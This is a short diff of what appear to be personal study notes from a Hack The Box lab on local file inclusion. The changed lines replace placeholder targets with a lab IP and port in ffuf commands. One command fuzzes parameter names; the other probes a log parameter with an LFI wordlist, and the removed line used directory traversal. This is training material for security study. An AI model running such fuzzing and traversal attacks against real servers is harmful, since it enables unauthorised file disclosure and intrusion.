@@ -299,7 +299,7 @@ We should first attempt reading these logs through LFI, and if we do have access
 ## Fuzzing Parameters
 
 ```shell-session
-alakin2504@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+alakin2504@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.66:34174/index.php?FUZZ=value' -fs 2287
 
 ...SNIP...
 ```
@@ -363,7 +363,7 @@ To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessl
 
 
 ```shell-session
-alakin2504@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+alakin2504@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://83.136.252.66:34174/ilf_admin/index.php?log=FUZZ' -fs 2287
 
 ...SNIP...
 
